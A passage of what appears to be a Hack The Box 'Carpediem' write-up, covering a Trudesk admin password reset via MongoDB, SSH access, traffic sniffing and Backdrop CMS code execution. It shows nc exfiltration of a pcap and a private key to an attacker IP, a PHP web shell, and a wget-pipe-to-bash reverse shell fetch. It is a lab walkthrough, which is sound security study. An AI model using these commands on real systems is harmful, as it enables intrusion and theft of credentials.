class="dt">:</span><span class="st">"2022-04-07T20:33:20.918Z"</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"6243c28f1e0d4d001b0740d6"</span><span class="op">,</span><span class="st">"groups"</span><span class="dt">:[]}</span><span class="op">,</span><span class="dt">{</span><span class="st">"preferences"</span><span class="dt">:{</span><span class="st">"tourCompleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"autoRefreshTicketGrid"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"openChatWindows"</span><span class="dt">:[]}</span><span class="op">,</span><span class="st">"hasL2Auth"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"deleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"6243c69d1acd1559cdb4019b"</span><span class="op">,</span><span class="st">"username"</span><span class="dt">:</span><span class="st">"svc-portal-tickets"</span><span class="op">,</span><span class="st">"email"</span><span class="dt">:</span><span class="st">"tickets@carpediem.htb"</span><span class="op">,</span><span class="st">"fullname"</span><span class="dt">:</span><span class="st">"Portal Tickets"</span><span class="op">,</span><span class="st">"title"</span><span class="dt">:</span><span class="st">""</span><span class="op">,</span><span class="st">"role"</span><span class="dt">:{</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba13a"</span><span class="op">,</span><span class="st">"name"</span><span class="dt">:</span><span class="st">"User"</span><span class="op">,</span><span class="st">"description"</span><span class="dt">:</span><span class="st">"Default role for users"</span><span class="op">,</span><span class="st">"normalized"</span><span class="dt">:</span><span class="st">"user"</span><span class="op">,</span><span class="st">"isAdmin"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"isAgent"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba13a"</span><span class="dt">}</span><span class="op">,</span><span class="st">"lastOnline"</span><span class="dt">:</span><span class="st">"2022-03-30T13:50:02.824Z"</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"6243c69d1acd1559cdb4019b"</span><span class="op">,</span><span class="st">"groups"</span><span class="dt">:[]}</span><span class="op">,</span><span class="dt">{</span><span class="st">"preferences"</span><span class="dt">:{</span><span class="st">"tourCompleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"autoRefreshTicketGrid"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"openChatWindows"</span><span class="dt">:[]}</span><span class="op">,</span><span class="st">"hasL2Auth"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"deleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba13c"</span><span class="op">,</span><span class="st">"username"</span><span class="dt">:</span><span class="st">"admin"</span><span class="op">,</span><span class="st">"fullname"</span><span class="dt">:</span><span class="st">"Robert Frost"</span><span class="op">,</span><span class="st">"email"</span><span class="dt">:</span><span class="st">"rfrost@carpediem.htb"</span><span class="op">,</span><span class="st">"role"</span><span class="dt">:{</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba138"</span><span class="op">,</span><span class="st">"name"</span><span class="dt">:</span><span class="st">"Admin"</span><span class="op">,</span><span class="st">"description"</span><span class="dt">:</span><span class="st">"Default role for admins"</span><span class="op">,</span><span class="st">"normalized"</span><span class="dt">:</span><span class="st">"admin"</span><span class="op">,</span><span class="st">"isAdmin"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"isAgent"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba138"</span><span class="dt">}</span><span class="op">,</span><span class="st">"title"</span><span class="dt">:</span><span class="st">"Sr. Network Engineer"</span><span class="op">,</span><span class="st">"lastOnline"</span><span class="dt">:</span><span class="st">"2022-04-07T20:30:32.198Z"</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba13c"</span><span class="op">,</span><span class="st">"groups"</span><span class="dt">:[]}]}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>With the help of Burp extension <em>Add Custom Header</em> add the accessToken and add it to all sessions (Project Options &gt; Sessions &gt; Session Handling Rules &gt; Invoke a Burp extension ), don’t forget to add the rule to be applied to <em>Proxy</em> as well.</p>
+<p><img src="images/carpediem13.png" class="img-fluid"></p>
+<p>We’re not able to bypass the login, so I guess we should focus on the api instead.</p>
+</section>
+<section id="step-6" class="level3">
+<h3 class="anchored" data-anchor-id="step-6">Step 6</h3>
+<p>Playing around with the API we have a few options, lets start by trying to change the password of the <em>admin</em> account.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl <span class="at">-X</span> PUT <span class="at">-H</span> <span class="st">"Content-Type: applications/json"</span> <span class="at">-H</span> <span class="st">"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> <span class="at">-d</span> <span class="st">"{"</span>aPass<span class="st">":"</span>aaAA123<span class="dt">\!</span><span class="st">", "</span>aPassconfirm<span class="st">":"</span>aaAA123<span class="dt">\!</span><span class="st">"}"</span> <span class="at">-l</span> http://trudesk.carpediem.htb/api/v1/users/admin  </span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="dt">{</span><span class="st">"success"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"user"</span><span class="dt">:{</span><span class="st">"preferences"</span><span class="dt">:{</span><span class="st">"tourCompleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"autoRefreshTicketGrid"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"openChatWindows"</span><span class="dt">:[]}</span><span class="op">,</span><span class="st">"hasL2Auth"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"deleted"</span><span class="dt">:false</span><span class="op">,</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba13c"</span><span class="op">,</span><span class="st">"username"</span><span class="dt">:</span><span class="st">"admin"</span><span class="op">,</span><span class="st">"fullname"</span><span class="dt">:</span><span class="st">"Robert Frost"</span><span class="op">,</span><span class="st">"email"</span><span class="dt">:</span><span class="st">"rfrost@carpediem.htb"</span><span class="op">,</span><span class="st">"role"</span><span class="dt">:{</span><span class="st">"grants"</span><span class="dt">:[</span><span class="st">"admin:*"</span><span class="op">,</span><span class="st">"agent:*"</span><span class="op">,</span><span class="st">"chat:*"</span><span class="op">,</span><span class="st">"tickets:*"</span><span class="op">,</span><span class="st">"accounts:*"</span><span class="op">,</span><span class="st">"groups:*"</span><span class="op">,</span><span class="st">"teams:*"</span><span class="op">,</span><span class="st">"departments:*"</span><span class="op">,</span><span class="st">"comments:*"</span><span class="op">,</span><span class="st">"reports:*"</span><span class="op">,</span><span class="st">"notices:*"</span><span class="op">,</span><span class="st">"settings:*"</span><span class="op">,</span><span class="st">"api:*"</span><span class="dt">]</span><span class="op">,</span><span class="st">"hierarchy"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"_id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba138"</span><span class="op">,</span><span class="st">"name"</span><span class="dt">:</span><span class="st">"Admin"</span><span class="op">,</span><span class="st">"description"</span><span class="dt">:</span><span class="st">"Default role for admins"</span><span class="op">,</span><span class="st">"normalized"</span><span class="dt">:</span><span class="st">"admin"</span><span class="op">,</span><span class="st">"__v"</span><span class="dt">:0</span><span class="op">,</span><span class="st">"isAdmin"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"isAgent"</span><span class="dt">:true</span><span class="op">,</span><span class="st">"id"</span><span class="dt">:</span><span class="st">"623c8b20855cc5001a8ba138"</span><span class="dt">}</span><span class="op">,</span><span class="st">"title"</span><span class="dt">:</span><span class="st">"Sr. Network Engineer"</span><span class="op">,</span><span class="st">"lastOnline"</span><span class="dt">:</span><span class="st">"2022-04-07T20:30:32.198Z"</span><span class="op">,</span><span class="st">"groups"</span><span class="dt">:[]}}</span><span class="ex">%</span> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Even though we get <code>"success":true</code> trying to login it still says that the password is incorrect.. But we do have access to the mongodb, maybe it would be easier to just change password in there.</p>
+<p>To generate a new bcrypt password I found this <a href="https://unix.stackexchange.com/questions/307994/compute-bcrypt-hash-from-command-line">amazing one-liner</a> where we (ab)use <code>htpasswd</code>:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem htpasswd <span class="at">-bnBC</span> 10 <span class="st">""</span> asdf123 <span class="kw">|</span> <span class="fu">tr</span> <span class="at">-d</span> <span class="st">':\n'</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">'s/$2y/$2b/'</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span><span class="ex">b</span><span class="va">$1</span><span class="ex">0</span><span class="va">$xI</span><span class="ex">/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> db.accounts.updateOne<span class="kw">(</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> { <span class="st">"username"</span> : <span class="st">"admin"</span> },</span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> { <span class="va">$set</span>:</span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> { <span class="st">"password"</span> : <span class="st">"</span><span class="va">$2</span><span class="st">b</span><span class="va">$1</span><span class="st">0</span><span class="va">$xI</span><span class="st">/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO"</span> }</span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> }</span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span> <span class="kw">)</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a><span class="kw">{</span> <span class="st">"acknowledged"</span> : true, <span class="st">"matchedCount"</span> : 1, <span class="st">"modifiedCount"</span> : 1 }</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We’re now able to login to the application <code>http://trudesk.carpediem.htb</code>: <img src="images/carpediem14.png" class="img-fluid"></p>
+<p>Looking around we don’t find anything new, information wise. Trying to change user avatar to a malicious one fails, as they move and rename the file on upload. The only interesting information we gain here is the soft phone name <em>“Zoiper”</em>, maybe there’s a vhost for that as well. I can’t find any web interface for Zoiper, so instead we <a href="https://www.zoiper.com/en/voip-softphone/download/current">download</a> it locally and try if we can connect to their server.</p>
+<p>We have the name of the new employee, Horace Flaccus (<code>hflaccus</code>), his pin is 2022, his extension is 9650 and dial <code>*62</code> to reach voicemail.</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  Downloads sudo dpkg <span class="at">-i</span> Zoiper5_5.5.13_x86_64.deb</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Enter username <code>9650</code> and password <code>2022</code>, when asked to fill in your hostname set it to <code>carpediem.htb</code>. <img src="images/carpediem15.png" class="img-fluid"></p>
+<p><img src="images/carpediem16.png" class="img-fluid"></p>
+<p>Calling and listening to Horace’s voice message we learn that the password is <code>AuRj4pxq9qPk</code> ! Testing to login with SSH and we finally get a shell on the box and user.txt.</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem ssh hflaccus@carpediem.htb</span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem.htb</span> password: AuRj4pxq9qPk</span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:~$</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">hflaccus</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">hflaccus</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">hflaccus</span><span class="kw">)</span></span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a><span class="ex">carpediem</span></span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:~$</span> cat user.txt </span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a><span class="ex">c34afcb6b1659fb635027da20531bc7e</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<hr>
+</section>
+</section>
+<section id="root" class="level1">
+<h1>ROOT</h1>
+<section id="step-1-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
+<p>Enumerating manually the information we find is pretty slim so instead fire up <code>linpeas.sh</code> right away.</p>
+<p>Going through the output we have two lines shining in red/yellow indicating a 95% PE vector</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:/tmp$</span> ./linpeas.sh</span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="ex">════════════════════════════════════╣</span> Processes, Cron, Services, Timers <span class="kw">&amp;</span> <span class="ex">Sockets</span> ╠════════════════════════════════════</span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="ex">╔══════════╣</span> Cleaned processes</span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[i]</span> Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes</span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a><span class="ex">╚</span> Check weird <span class="kw">&amp;</span> <span class="ex">unexpected</span> proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes</span>
+<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a>                 <span class="ex">1578848</span>   sed-Es,jdwp<span class="kw">|</span><span class="ex">tmux</span> <span class="kw">|</span><span class="ex">screen</span> <span class="kw">|</span><span class="ex">--inspect</span><span class="kw">|</span><span class="ex">--remote-debugging-port,</span><span class="kw">&amp;</span><span class="ex">,g</span></span>
+<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a><span class="ex">╔══════════╣</span> Capabilities</span>
+<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="ex">╚</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities</span>
+<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Files</span> with capabilities <span class="er">(</span><span class="ex">limited</span> to 50<span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/sbin/tcpdump</span> = cap_net_admin,cap_net_raw+eip</span>
+<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a><span class="ex">╔══════════╣</span> Can I sniff with tcpdump<span class="pp">?</span></span>
+<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a><span class="ex">╚</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing</span>
+<span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a><span class="ex">You</span> can sniff with tcpdump!</span>
+<span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-18"><a href="#cb29-18" aria-hidden="true" tabindex="-1"></a><span class="ex">══╣</span> Possible private SSH keys were found!</span>
+<span id="cb29-19"><a href="#cb29-19" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/ssl/certs/backdrop.carpediem.htb.key</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>There’s a section on <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_net_admin-+-cap_net_raw">HackTricks</a> explaining the capabilities combination of <code>cep_net_admin</code> + <code>cap_net_raw</code> - tldr we can dump traffic from network interfaces. I’m not sure what we’re looking for, or what interface to dump, but since there are a lot of dockers and we know that there is a FTP + several http services, we might find something sensitive there.</p>
+<p>NOTE: I left this pcap on for about 1 hour while leaving for a meeting, so there’s a lot of traffic in my .pcap.</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nc <span class="at">-lp</span> 1234 <span class="op">&gt;</span> docker0.pcap</span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:/tmp$</span> tcpdump <span class="at">-i</span> docker0 <span class="at">-s</span> 65535 <span class="at">-w</span> docker0.pcap</span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="ex">tcpdump:</span> listening on docker0, link-type EN10MB <span class="er">(</span><span class="ex">Ethernet</span><span class="kw">)</span><span class="ex">,</span> capture size 65535 bytes</span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="ex">7171</span> packets captured</span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="ex">7171</span> packets received by filter</span>
+<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span> packets dropped by kernel</span>
+<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:/tmp$</span> nc <span class="at">-w3</span> 10.10.14.10 1234 <span class="op">&lt;</span> docker0.pcap</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Instead of using Wireshark like it’s 1998, I send the .pcap to my Windows Attack VM and open it using <em>NetworkMiner</em> (like it’s 2007) - I think this gives a better quick overview of the dump. From the dump we can quickly see that a certificate has been sent from <code>backdrop.carpediem.htb</code> to the docker host on 172.17.0.1, I have no idea of what to do with this information.</p>
+<p><img src="images/carpediem17.png" class="img-fluid"></p>
+<p>Next step took me embarrassingly long time to figure out - from our <em>linpeas</em> output we found a private SSH key. We can use this key to decrypt all SSL traffic, and within we find something interesting.</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nc <span class="at">-lp</span> 1234 <span class="op">&gt;</span> backdrop.carpediem.htb.key</span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:/tmp$</span> nc <span class="at">-w3</span> 10.10.14.10 1234 <span class="op">&lt;</span> /etc/ssl/certs/backdrop.carpediem.htb.key</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><img src="images/carpediem18.png" class="img-fluid"></p>
+<p>Now if we follow the TLS Stream we find a login to https://backdrop.carpediem.htb with credentials <code>jpardella:tGPN6AmJDZwYWdhY</code> <img src="images/carpediem19.png" class="img-fluid"></p>
+</section>
+<section id="step-2-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
+<p>Now to access <code>backdrop</code> we cant simply tunnel with <code>hflaccus</code>:</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:~$</span> cat /etc/hosts</span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="ex">127.0.0.1</span> localhost backdrop.carpediem.htb</span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem:~$</span> netstat <span class="at">-tulpn</span></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Active</span> Internet connections <span class="er">(</span><span class="ex">only</span> servers<span class="kw">)</span></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:8000          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:8001          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:8002          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:5038          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>  </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Going through all the different ports we find that <strong>8002</strong> is <code>backdrop</code>:</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem ssh <span class="at">-N</span> <span class="at">-f</span> <span class="at">-L</span> 8002:localhost:8002 hflaccus@carpediem.htb</span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">hflaccus@carpediem.htb</span> password: AuRj4pxq9qPk</span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl <span class="at">-k</span> https://localhost:8002</span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>title<span class="op">&gt;</span>Home <span class="kw">|</span> <span class="ex">backdrop.carpediem.htb</span><span class="op">&lt;</span>/title<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We’re now able to login to <em>backdrop</em> using credentials <code>jpardella:tGPN6AmJDZwYWdhY</code> <img src="images/carpediem20.png" class="img-fluid"></p>
+<p>Googling for <em>“Backdrop cms exploit github”</em> the first hit we get is a <a href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS">CSRF to RCE</a> exploit for version 1.20. Looking in backdrop under <em>Reports</em> &gt; <em>Status Report</em> we see that our instance is running version 1.21.4, lets test it anyway.</p>
+<p>Go to <em>Functionality</em> &gt; <em>Install new modules</em> &gt; <em>Manual Installation</em> &gt; <em>Upload</em>, once uploaded make sure to enable the newly added module. It will be located at the bottom of the box <em>Fields</em>:</p>
+<p><img src="images/carpediem21.png" class="img-fluid"></p>
+<p>Testing it out and yes, we do have code execution:</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl <span class="at">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=id      </span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>33<span class="kw">(</span><span class="ex">www-data</span><span class="kw">)</span></span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl <span class="at">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=hostname</span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="ex">90c7f522b842</span></span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl <span class="at">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=ls%20-al</span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 76</span>
+<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 4 www-data www-data  4096 Sep 14 00:55 .</span>
+<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 3 www-data www-data  4096 Sep 14 00:55 ..</span>
+<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data 18092 Sep 14 00:55 LICENSE.txt</span>
+<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data  1768 Sep 14 00:55 README.md</span>
+<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   323 Sep 14 00:55 reference.info</span>
+<span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data   484 Sep 14 00:55 reference.install</span>
+<span id="cb34-13"><a href="#cb34-13" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data 23598 Sep 14 00:55 reference.module</span>
+<span id="cb34-14"><a href="#cb34-14" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 www-data www-data    30 Sep 14 00:55 shell.php</span>
+<span id="cb34-15"><a href="#cb34-15" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 2 www-data www-data  4096 Sep 14 00:55 tests</span>
+<span id="cb34-16"><a href="#cb34-16" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 2 www-data www-data  4096 Sep 14 00:55 views</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Using cURL to trigger a reverse shell (like before) doesn’t seem to work in this container, instead we use <strong>wget</strong>:</p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem curl <span class="at">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=wget%20-qO-%20http://10.10.14.10/rev.sh\|bash</span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem python3 <span class="at">-m</span> http.server 80</span>
